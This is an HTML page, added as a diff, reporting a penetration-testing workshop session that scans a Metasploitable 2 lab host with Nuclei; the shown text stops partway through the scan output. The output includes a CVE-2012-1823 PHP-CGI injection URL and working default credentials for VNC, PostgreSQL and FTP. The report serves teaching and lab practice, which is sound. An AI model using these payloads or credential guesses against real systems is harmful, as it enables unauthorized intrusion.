@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta name="robots" content="index, follow">
+
+  <title>Day 6: Automated Vulnerability Scanning with Nuclei & GitHub Reconnaissance / Secret Hunting | BugXploit Workshop | The WH2</title>
+  <meta name="description"
+    content="Day 6 deep-dive ethical hacking report from BugXploit (Koteshwor): Automated vulnerability scanning using ProjectDiscovery Nuclei against DVWA/Metasploitable 2, terminal scan breakdown (CVE-2012-1823 PHP-CGI, Samba 3.0.20 CVE-2026-4480, DistCC CVE-2004-2687, default PostgreSQL & VNC credentials, vsftpd auditing, security headers), manual and automated GitHub reconnaissance, secret scanning dorks, in-depth streaak/keyhacks API key exploitation analysis, iscan.today, Benji Trapp dorks, and TruffleHog.">
+  <meta name="keywords"
+    content="Ethical Hacking Day 6, BugXploit Workshop, Nuclei scanner, ProjectDiscovery, Automated Vulnerability Scanning, DVWA authenticated scan, CVE-2012-1823, Samba 3.0.20, CVE-2004-2687 DistCC, vsftpd 2.3.4, PostgreSQL default credentials, VNC brute force, GitHub Recon, GitHub Dorks, secret hunting, API key leak, streaak keyhacks, keyhacks tutorial, TruffleHog, iscan.today, Benji Trapp, Birendra Sah, Bishal Shrestha, Chandan Kumar Thakur, The WH2, Penetration Testing Nepal, Koteshwor Kathmandu">
+  <meta name="author" content="Chandan Kumar Thakur (The WH2)">
+
+  <link rel="canonical"
+    href="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day6/">
+
+  <!-- Open Graph / Meta Consistency -->
+  <meta property="og:title"
+    content="Day 6: Nuclei Automated Vulnerability Scanning & GitHub Secret Reconnaissance | BugXploit Workshop">
+  <meta property="og:description"
+    content="Comprehensive Day 6 lab report: ProjectDiscovery Nuclei authenticated scanning on DVWA/Metasploitable 2, analyzing 69 findings (CVE-2012-1823, Samba, DistCC, default credentials, security headers), plus advanced GitHub OSINT, keyhacks secret validation, iscan.today, and TruffleHog.">
+  <meta property="og:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+  <meta property="og:url"
+    content="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day6/">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="The WH2 Knowledge Hub">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Day 6: Nuclei Scanning & GitHub Secret Hunting | BugXploit">
+  <meta name="twitter:description"
+    content="In-depth Day 6 ethical hacking report: Nuclei vulnerability scanning with session cookies, Metasploitable 2 CVE triage, GitHub secret reconnaissance, keyhacks API validation, and TruffleHog automation. Documented by The WH2.">
+  <meta name="twitter:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+
+  <!-- JSON-LD TechArticle Schema for Search Engines and AI Crawlers -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Day 6: Automated Vulnerability Scanning with Nuclei & GitHub Reconnaissance / Secret Hunting - BugXploit Workshop",
+    "description": "Comprehensive technical penetration testing report covering ProjectDiscovery Nuclei automated vulnerability scanning against DVWA on Metasploitable 2 with authenticated cookie injection, triage of 69 terminal findings (CVE-2012-1823 PHP-CGI execution, Samba 3.0.20 CVE-2026-4480, DistCC daemon CVE-2004-2687, vsftpd 2.3.4 banner inspection, PostgreSQL port 5432 blank and default credentials, VNC port 5900 weak logins, missing HTTP security headers), manual vs automated GitHub reconnaissance, sensitive token search dorks, deep analysis of streaak/keyhacks for API key validation (AWS, Stripe, Google Maps, Twilio, Slack), iscan.today, Benji Trapp dorking repository, and TruffleHog git entropy scanner.",
+    "about": [
+      {
+        "@type": "SoftwareApplication",
+        "name": "Nuclei by ProjectDiscovery"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "TruffleHog"
+      },
+      {
+        "@type": "Thing",
+        "name": "CVE-2012-1823 (PHP-CGI Remote Code Execution)"
+      },
+      {
+        "@type": "Thing",
+        "name": "GitHub Dorking & Secret Leakage"
+      },
+      {
+        "@type": "SoftwareSourceCode",
+        "name": "streaak/keyhacks"
+      }
+    ],
+    "author": {
+      "@type": "Person",
+      "name": "Chandan Kumar Thakur",
+      "alternateName": "The WH2",
+      "jobTitle": "AI Architect & Cybersecurity Researcher",
+      "url": "https://www.chandankumarthakur.com.np/",
+      "sameAs": [
+        "https://www.linkedin.com/in/thewh2/",
+        "https://github.com/thewh2"
+      ]
+    },
+    "contributor": [
+      {
+        "@type": "Person",
+        "name": "Birendra Sah",
+        "jobTitle": "Offensive Security Trainer & Cybersecurity Instructor",
+        "sameAs": "https://www.linkedin.com/in/birendrasah4u2/"
+      },
+      {
+        "@type": "Person",
+        "name": "Bishal Shrestha",
+        "jobTitle": "Security Researcher & Penetration Testing Specialist",
+        "sameAs": "https://www.linkedin.com/in/bishal0x01/"
+      }
+    ],
+    "publisher": {
+      "@type": "Organization",
+      "name": "The WH2",
+      "url": "https://www.chandankumarthakur.com.np/",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.chandankumarthakur.com.np/assets/img/wh2.jpg"
+      }
+    },
+    "educationalLevel": "Intermediate to Advanced",
+    "inLanguage": "en",
+    "datePublished": "2026-09-13",
+    "dateModified": "2026-09-13",
+    "mainEntityOfPage": "https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day6/"
+  }
+  </script>
+
+  <!-- Favicons -->
+  <link href="../../../assets/img/favicon.png" rel="icon">
+  <link href="../../../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../../../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../../../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="../../../assets/css/style.css" rel="stylesheet">
+
+  <style>
+    .lesson-article h2 {
+      color: #173b6c;
+      font-size: 22px;
+      font-weight: 700;
+      margin-top: 35px;
+      margin-bottom: 16px;
+      padding-bottom: 8px;
+      border-bottom: 2px solid #eef3f7;
+    }
+
+    .lesson-article h3 {
+      color: #2c4964;
+      font-size: 18px;
+      font-weight: 600;
+      margin-top: 25px;
+      margin-bottom: 12px;
+    }
+
+    .lesson-article h4 {
+      color: #3f6586;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 18px;
+      margin-bottom: 8px;
+    }
+
+    .lesson-article p,
+    .lesson-article li {
+      font-size: 15.5px;
+      line-height: 1.75;
+      color: #333;
+    }
+
+    .lesson-article pre {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 18px 20px;
+      border-radius: 8px;
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      font-size: 13.5px;
+      overflow-x: auto;
+      margin: 18px 0;
+      border: 1px solid #333;
+      position: relative;
+    }
+
+    .lesson-article code {
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      background: #eef2f7;
+      color: #b02a37;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13.5px;
+    }
+
+    .lesson-article pre code {
+      background: transparent;
+      color: inherit;
+      padding: 0;
+    }
+
+    .callout-box {
+      background: #eef7fc;
+      border-left: 4px solid #149ddd;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-box.security-notice {
+      background: rgba(239, 68, 68, 0.08);
+      border-left-color: #ef4444;
+    }
+
+    .callout-box.security-notice h4 {
+      color: #b91c1c;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .callout-warning {
+      background: #fff8e6;
+      border-left: 4px solid #ffc107;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-danger {
+      background: #fdf2f2;
+      border-left: 4px solid #dc3545;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-success {
+      background: #f0fbf4;
+      border-left: 4px solid #198754;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .lesson-nav-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 15px;
+      margin-top: 45px;
+      padding-top: 25px;
+      border-top: 1px solid #eef3f7;
+    }
+
+    .code-block-wrapper {
+      position: relative;
+    }
+
+    .code-copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 12px;
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #e0e0e0;
+      padding: 4px 10px;
+      font-size: 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      z-index: 5;
+    }
+
+    .code-copy-btn:hover {
+      background: #149ddd;
+      color: #fff;
+      border-color: #149ddd;
+    }
+
+    .code-copy-btn.copied {
+      background: #28a745;
+      color: #fff;
+      border-color: #28a745;
+    }
+
+    .terminal-window {
+      background: #0d1117;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      margin: 20px 0;
+      overflow: hidden;
+      font-family: 'Fira Code', monospace;
+    }
+
+    .terminal-header {
+      background: #161b22;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #30363d;
+    }
+
+    .terminal-circle {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+    }
+
+    .tc-red { background: #ff5f56; }
+    .tc-yellow { background: #ffbd2e; }
+    .tc-green { background: #27c93f; }
+
+    .terminal-title {
+      color: #8b949e;
+      font-size: 12px;
+      margin-left: 6px;
+    }
+
+    .terminal-body {
+      padding: 16px;
+      color: #c9d1d9;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .prompt-symbol {
+      color: #58a6ff;
+      font-weight: bold;
+    }
+
+    .command-output {
+      color: #8b949e;
+    }
+
+    .severity-pill {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      display: inline-block;
+    }
+    .sev-critical { background: #d73a49; color: #fff; }
+    .sev-high { background: #e36209; color: #fff; }
+    .sev-medium { background: #dbab09; color: #000; }
+    .sev-low { background: #28a745; color: #fff; }
+    .sev-info { background: #0366d6; color: #fff; }
+
+    .keyhack-card {
+      border: 1px solid #e1e4e8;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 16px;
+      background: #fdfdfd;
+      transition: box-shadow 0.2s ease;
+    }
+    .keyhack-card:hover {
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+    }
+  </style>
+</head>
+
+<body class="knowledge-page">
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Day 6: Nuclei Scanning &amp; GitHub Reconnaissance</h2>
+          <ol>
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../index.html">Knowledge</a></li>
+            <li><a href="../index.html">Ethical Hacking</a></li>
+            <li>Day 6 Report</li>
+          </ol>
+        </div>
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Lesson Detailed Content ======= -->
+    <section class="knowledge-section">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row">
+          <div class="col-lg-9 mx-auto">
+
+            <article class="lesson-article">
+
+              <!-- Article Header / Meta -->
+              <div class="border-bottom pb-3 mb-4">
+                <div class="d-flex flex-wrap gap-2 mb-2">
+                  <span class="badge bg-primary">Session 06 / 14</span>
+                  <span class="badge bg-dark">BugXploit Workshop</span>
+                </div>
+                <h1 class="fw-bold" style="color: #173b6c; font-size: 28px; line-height: 1.3;">
+                  Day 6: Automated Vulnerability Scanning with Nuclei &amp; GitHub Reconnaissance / Secret Hunting
+                </h1>
+                <div class="text-muted d-flex flex-wrap gap-3 mt-2 small align-items-center">
+                  <span><i class="bi bi-person-circle text-primary"></i> <strong>Report By:</strong> TheWH2</span>
+                  <span>
+                    <i class="bi bi-person-video3 text-primary"></i> <strong>Instructors:</strong>
+                    <a href="https://www.linkedin.com/in/birendrasah4u2/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Birendra Sah <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                    &bull;
+                    <a href="https://www.linkedin.com/in/bishal0x01/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Bishal Shrestha <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                  </span>
+                  <span><i class="bi bi-building text-primary"></i> <strong>Institute:</strong> BugXploit (Koteshwor)</span>
+                  <span><i class="bi bi-clock text-primary"></i> <strong>Read Time:</strong> ~18 mins</span>
+                </div>
+              </div>
+
+              <!-- Content Body -->
+              <div class="article-content">
+
+                <!-- Alert/Notice Box -->
+                <div class="callout-box security-notice">
+                  <h4><i class="bi bi-shield-exclamation"></i> Security Notice &amp; Lab Scope</h4>
+                  <p class="mb-0 small">
+                    This technical report documents official training conducted during Day 6 of the Ethical Hacking and Penetration Testing Workshop at <strong>BugXploit</strong> (Koteshwor, Kathmandu). All automated scans utilizing ProjectDiscovery's Nuclei scanner and manual service verifications were executed inside an isolated, private virtual host-only lab environment targeting Metasploitable 2 (<code>192.168.1.146</code>). Furthermore, all GitHub reconnaissance, secret scanning, and API key validation methodologies are described strictly for authorized defensive audits, bug bounty programs operating under explicit safe-harbor guidelines, and proactive source-code protection.
+                  </p>
+                </div>
+
+                <!-- Table of Contents -->
+                <div class="card mb-4 border-light shadow-sm" style="background: #fafcfe;">
+                  <div class="card-body">
+                    <h5 class="fw-bold mb-3" style="color: #173b6c;"><i class="bi bi-list-nested"></i> Table of Contents</h5>
+                    <div class="row">
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#automation-paradigm" class="text-decoration-none">1. The Shift to Automation: Manual vs. Automated Scanning</a></li>
+                          <li><a href="#nuclei-engine" class="text-decoration-none">2. ProjectDiscovery Nuclei Architecture &amp; Upgrades</a></li>
+                          <li><a href="#authenticated-scan" class="text-decoration-none">3. Authenticated Scanning: Passing Session Cookies &amp; Headers</a></li>
+                          <li><a href="#terminal-scan-log" class="text-decoration-none">4. Live Terminal Execution &amp; Scan Output Breakdown</a></li>
+                          <li><a href="#critical-cve-triage" class="text-decoration-none">5. In-Depth CVE Analysis: PHP-CGI, Samba &amp; DistCC</a></li>
+                          <li><a href="#default-credentials" class="text-decoration-none">6. Default Credentials &amp; Weak Service Auditing (Postgres, VNC, FTP)</a></li>
+                        </ul>
+                      </div>
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#ftp-terminal-verification" class="text-decoration-none">7. Terminal Verification: vsftpd 2.3.4 &amp; Anonymous Access</a></li>
+                          <li><a href="#http-security-headers" class="text-decoration-none">8. Web Defense Gap: Missing HTTP Security Headers</a></li>
+                          <li><a href="#github-recon-dorks" class="text-decoration-none">9. GitHub Reconnaissance &amp; Sensitive Token Dorking</a></li>
+                          <li><a href="#streaak-keyhacks" class="text-decoration-none">10. Deep Dive: streaak/keyhacks &amp; API Key Validation</a></li>
+                          <li><a href="#github-hunting-tools" class="text-decoration-none">11. Advanced Secret Hunting: iscan.today, Benji Trapp &amp; TruffleHog</a></li>
+                          <li><a href="#defense-remediation" class="text-decoration-none">12. Defensive Engineering: Pre-Commit Hooks &amp; Secret Hygiene</a></li>
+                          <li><a href="#day6-takeaways" class="text-decoration-none">13. Day 6 Summary &amp; Key Takeaways</a></li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Section 1 -->
+                <h2 id="automation-paradigm">1. The Shift to Automation: Manual vs. Automated Scanning</h2>
+                <p>
+                  Throughout Days 1 through 5 of the BugXploit workshop, every phase of penetration testing was conducted manually: discovering live hosts with ARP and Nmap, crafting targeted netcat queries against daemon banners, intercepting raw HTTP streams with Burp Suite Proxy, manually configuring Intruder payload markers, and injecting precision payloads for SQL injection, Command Injection, and Cross-Site Scripting (XSS).
+                </p>
+                <p>
+                  While manual testing gives a penetration tester an unmatched understanding of protocol semantics and application logic, modern enterprise perimeters and cloud-native applications contain thousands of microservices, third-party libraries, and disparate network daemons. Manually checking every known vulnerability against every open port is operationally impossible.
+                </p>
+                <p>
+                  <strong>Automated vulnerability scanners</strong> bridge this gap by rapidly querying target infrastructure against large, community-curated template repositories. On Day 6, the workshop shifted gears from purely manual exploitation to industrial-grade automation using <strong>Nuclei</strong> by ProjectDiscovery, paired with modern <strong>GitHub Reconnaissance and Secret Hunting</strong>.
+                </p>
+
+                <div class="table-responsive my-3">
+                  <table class="table table-bordered table-striped align-middle">
+                    <thead class="table-light">
+                      <tr>
+                        <th style="width: 20%;">Approach</th>
+                        <th style="width: 40%;">Strengths</th>
+                        <th style="width: 40%;">Limitations</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Manual Testing</strong><br><span class="badge bg-secondary">Days 1 - 5</span></td>
+                        <td>
+                          Deep logical flaws (IDOR, multi-step business logic bypass, complex race conditions), zero false positives when validated, stealthy and customized traffic patterns.
+                        </td>
+                        <td>
+                          Extremely time-consuming, difficult to scale across broad IP ranges or thousands of endpoints, subject to human oversight on obscure CVEs.
+                        </td>
+                      </tr>
+                      <tr>
+                        <td><strong>Automated Scanning</strong><br><span class="badge bg-primary">Day 6 (Nuclei)</span></td>
+                        <td>
+                          Unmatched speed and coverage (executes 10,000+ templates in minutes), standardized regression testing, instant detection of known CVEs, outdated versions, and default credentials.
+                        </td>
+                        <td>
+                          Generates noise on networks, cannot understand intricate multistage business logic without custom state machines, potential for false positives or denial-of-service on fragile legacy daemons.
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <!-- Section 2 -->
+                <h2 id="nuclei-engine">2. ProjectDiscovery Nuclei Architecture &amp; Upgrades</h2>
+                <p>
+                  <strong>Nuclei</strong> is a fast, template-driven vulnerability scanner written in Go by ProjectDiscovery. Unlike heavyweight legacy scanners that rely on rigid, closed-source engines, Nuclei is completely modular:
+                </p>
+                <ul>
+                  <li><strong>YAML-Based Templates:</strong> Every test (HTTP, TCP, DNS, SSL, Websocket, Whois, Javascript, Headless browser) is defined in a human-readable YAML document specifying request parameters, matchers, extractors, and payload conditions.</li>
+                  <li><strong>Protocol Clustering:</strong> Nuclei analyzes loaded templates and clusters identical requests together. If 50 different templates target <code>/dvwa/login.php</code>, Nuclei groups them into a single HTTP connection, drastically reducing network overhead and preventing target server exhaustion.</li>
+                  <li><strong>Out-of-Band (OAST) Integration:</strong> Native integration with <code>Interactsh</code> (e.g., <code>oast.online</code>) allows Nuclei to detect Blind RCE, Blind SSRF, and DNS exfiltration without exposing the tester's external IP address.</li>
+                </ul>
+
+                <p>
+                  Prior to initiating any automated assessment in Kali Linux, both the Nuclei binary and its community template library must be brought to the latest upstream release to ensure detection of newly disclosed zero-days and signature improvements.
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">kali@kali: ~ (Updating Nuclei)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">┌──(kali㉿kali)-[~]</span><br>
+                    <span class="prompt-symbol">└─$</span> sudo apt update && sudo apt install --only-upgrade nuclei<br>
+                    <span class="command-output">[sudo] password for kali: *******<br>
+                    Hit:1 http://kali.download/kali kali-rolling InRelease<br>
+                    Reading package lists... Done<br>
+                    Building dependency tree... Done<br>
+                    nuclei is already the newest version.</span><br><br>
+                    <span class="prompt-symbol">┌──(kali㉿kali)-[~]</span><br>
+                    <span class="prompt-symbol">└─$</span> nuclei -update-templates<br>
+                    <span class="command-output">[INF] Successfully updated nuclei-templates to v10.4.8 (+112 new templates added)</span>
+                  </div>
+                </div>
+
+                <!-- Section 3 -->
+                <h2 id="authenticated-scan">3. Authenticated Scanning: Passing Session Cookies &amp; Headers</h2>
+                <p>
+                  Unauthenticated vulnerability scanners only inspect public landing pages (such as <code>login.php</code> or the web server default page). Vulnerabilities residing behind login portals—such as internal administration dashboards, command injection forms, file uploaders, or SQL injection vectors—remain invisible unless the scanner is supplied with a valid session state.
+                </p>
+                <p>
+                  In DVWA, users must authenticate with <code>admin:password</code> and maintain an active PHP session. Furthermore, DVWA maintains an internal security state cookie (<code>security=low</code>). To scan the application from the perspective of an authenticated, low-privilege user, we pass the custom session cookie directly into Nuclei using the <code>-H</code> (Header) flag and record all output to <code>dvwa_results.txt</code>.
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">kali@kali: ~ (Nuclei Authenticated Command)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">┌──(kali㉿kali)-[~]</span><br>
+                    <span class="prompt-symbol">└─$</span> nuclei -u http://192.168.1.146/dvwa/ -H "Cookie: PHPSESSID=40adc2b5fdf26e8ed977f4006c3b2d3a; security=low" -o dvwa_results.txt
+                  </div>
+                </div>
+
+                <div class="callout-box">
+                  <h5 class="fw-bold text-primary mb-1"><i class="bi bi-info-circle-fill"></i> Flag Breakdown:</h5>
+                  <ul class="mb-0 small">
+                    <li><code>-u &lt;target&gt;</code>: Defines the target URL or network address. When a full URL path like <code>/dvwa/</code> is given, Nuclei targets the web root while also inspecting standard host network ports.</li>
+                    <li><code>-H "Header: Value"</code>: Injects custom HTTP request headers on every HTTP-based template. By supplying both <code>PHPSESSID</code> and <code>security=low</code>, Nuclei scans DVWA in its authenticated, vulnerable configuration.</li>
+                    <li><code>-o dvwa_results.txt</code>: Instructs Nuclei to log every finding, match condition, and severity rating into a clean text file for post-assessment reporting.</li>
+                  </ul>
+                </div>
+
+                <!-- Section 4 -->
+                <h2 id="terminal-scan-log">4. Live Terminal Execution &amp; Scan Output Breakdown</h2>
+                <p>
+                  Upon launching the scan, Nuclei loaded <strong>10,730 templates</strong>, executed intelligent clustering (collapsing 2,336 duplicate requests), engaged its Interactsh engine, and completed the scan in approximately <strong>3 minutes</strong>, returning <strong>69 actionable vulnerability matches</strong> across HTTP, TCP, and Javascript protocols:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Nuclei Execution Stream: Metasploitable 2 (192.168.1.146)</span>
+                  </div>
+                  <div class="terminal-body" style="font-size: 12.5px; max-height: 480px; overflow-y: auto;">
+                    <span class="prompt-symbol">┌──(kali㉿kali)-[~]</span><br>
+                    <span class="prompt-symbol">└─$</span> nuclei -u http://192.168.1.146/dvwa/ -H "Cookie: PHPSESSID=40adc2b5fdf26e8ed977f4006c3b2d3a; security=low" -o dvwa_results.txt<br><br>
+                    <span class="command-output">
+                     __ _<br>
+   ____ __ _______/ /__ (_)<br>
+  / __ \/ / / / ___/ / _ \/ /<br>
+ / / / / /_/ / /__/ / __/ /<br>
+/_/ /_/\__,_/\___/_/\___/_/ v3.11.1<br><br>
+                projectdiscovery.io<br><br>
+[INF] Current nuclei version: v3.11.1 (outdated)<br>
+[INF] Current nuclei-templates version: v10.4.8 (latest)<br>
+[INF] New templates added in latest release: 112<br>
+[INF] Templates loaded for current scan: 10730<br>
+[INF] Executing 10730 signed templates from projectdiscovery/nuclei-templates<br>
+[INF] Targets loaded for current scan: 1<br>
+[INF] Templates clustered: 2468 (Reduced 2336 Requests)<br>
+[INF] Using Interactsh Server: oast.online<br>
+<span style="color: #ff5f56; font-weight: bold;">[CVE-2012-1823]</span> [http] [<span style="color: #e36209; font-weight: bold;">high</span>] http://192.168.1.146/dvwa/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input<br>
+[phpinfo-files] [http] [low] http://192.168.1.146/dvwa//phpinfo.php [paths="/phpinfo.php"]<br>
+[apache-mod-negotiation-listing:exposed_files] [http] [low] http://192.168.1.146/dvwa/login ["login.php"] [path="/login"]<br>
+[apache-mod-negotiation-listing:exposed_files] [http] [low] http://192.168.1.146/dvwa/index ["index.php"] [path="/index"]<br>
+[waf-detect:apachegeneric] [http] [info] http://192.168.1.146/dvwa/<br>
+[ssh-auth-methods] [javascript] [info] 192.168.1.146:22 ["["publickey","password"]"]<br>
+[mysql-info] [javascript] [info] 192.168.1.146:3306 ["Transport: tcp","Version: 5.0.51a-3ubuntu5"]<br>
+[rlogin-detect] [javascript] [info] 192.168.1.146:513<br>
+<span style="color: #e36209; font-weight: bold;">[vnc-default-login]</span> [javascript] [high] 192.168.1.146:5900 [FQDN="192.168.1.146",Host="192.168.1.146",Hostname="192.168.1.146:5900",Port="5900",passwords="password123"]<br>
+[samba-detect] [javascript] [info] 192.168.1.146:445 ["Samba 3.0.20-Debian"]<br>
+<span style="color: #d73a49; font-weight: bold;">[CVE-2026-4480:version]</span> [javascript] [<span style="color: #d73a49; font-weight: bold;">critical</span>] 192.168.1.146:445 ["3.0.20"]<br>
+<span style="color: #e36209; font-weight: bold;">[vnc-default-login]</span> [javascript] [high] 192.168.1.146:5900 [FQDN="192.168.1.146",Host="192.168.1.146",Hostname="192.168.1.146:5900",Port="5900",passwords="password"]<br>
+<span style="color: #e36209; font-weight: bold;">[postgres-default-logins]</span> [javascript] [high] 192.168.1.146:5432 [passwords="postgres",usernames="postgres"]<br>
+<span style="color: #e36209; font-weight: bold;">[pgsql-default-db]</span> [javascript] [high] 192.168.1.146:5432 [database="postgres",password="postgres",usernames="postgres"]<br>
+<span style="color: #e36209; font-weight: bold;">[pgsql-default-db]</span> [javascript] [high] 192.168.1.146:5432 [database="template1",password="postgres",usernames="postgres"]<br>
+<span style="color: #e36209; font-weight: bold;">[pgsql-default-db]</span> [javascript] [high] 192.168.1.146:5432 [database="postgres",password="",usernames="postgres"]<br>
+[ntlm-info] [javascript] [info] 192.168.1.146:445 ["NTLM: Samba 3.0.20-Debian"]<br>
+[smb-v1-supported] [javascript] [info] 192.168.1.146:445<br>
+[smb-version-detect:smb-version] [javascript] [info] 192.168.1.146:445 ["SMB 1.0"]<br>
+[ssh-diffie-hellman-logjam] [javascript] [low] 192.168.1.146:22<br>
+[ssh-password-auth] [javascript] [info] 192.168.1.146:22<br>
+[ssh-server-enumeration] [javascript] [info] 192.168.1.146:22 ["SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1"]<br>
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.1.146:22<br>
+[ajp-protocol-detect] [javascript] [info] 192.168.1.146:8009 ["AJP Detected"]<br>
+<span style="color: #e36209; font-weight: bold;">[pgsql-default-db]</span> [javascript] [high] 192.168.1.146:5432 [database="template1",password="",usernames="postgres"]<br>
+<span style="color: #d73a49; font-weight: bold;">[pgsql-empty-password]</span> [javascript] [<span style="color: #d73a49; font-weight: bold;">critical</span>] 192.168.1.146:5432<br>
+[ssh-cbc-mode-ciphers] [javascript] [low] 192.168.1.146:22<br>
+[ssh-weak-algo-supported] [javascript] [medium] 192.168.1.146:22<br>
+[ssh-weak-mac-algo] [javascript] [low] 192.168.1.146:22<br>
+[ssh-weakkey-exchange-algo] [javascript] [low] 192.168.1.146:22<br>
+[netbios-udp-detect] [javascript] [info] 192.168.1.146:137 ["NetBIOS Name Service Detected"]<br>
+[rpc-udp-detect] [javascript] [info] 192.168.1.146:111 ["RPC Portmapper UDP Detected"]<br>
+<span style="color: #e36209; font-weight: bold;">[CVE-2004-2687]</span> [tcp] [high] 192.168.1.146:3632<br>
+[CVE-2015-1419:version] [tcp] [medium] 192.168.1.146:21 ["2.3.4"]<br>
+<span style="color: #e36209; font-weight: bold;">[CVE-2021-30047:version]</span> [tcp] [high] 192.168.1.146:21 ["2.3.4"]<br>
+[ftp-anonymous-login] [tcp] [medium] 192.168.1.146:21<br>
+[esmtp-detect] [tcp] [info] 192.168.1.146:25<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="password",username="ftp"]<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="toor",username="ftp"]<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="nas",username="ftp"]<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="pass1",username="ftp"]<br>
+[ftp-detect] [tcp] [info] 192.168.1.146:21<br>
